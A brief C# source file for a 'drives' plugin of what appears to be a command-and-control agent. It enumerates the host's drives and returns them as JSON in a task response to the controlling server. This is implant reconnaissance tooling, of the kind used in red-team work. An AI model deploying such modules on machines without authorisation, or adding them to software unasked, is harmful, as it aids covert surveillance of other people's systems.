using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "drives";
        private IMessageManager messageManager { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            try
            {
                string output = JsonSerializer.Serialize(DriveInfo.GetDrives());
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = output,
                    completed = true
                });
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }
}
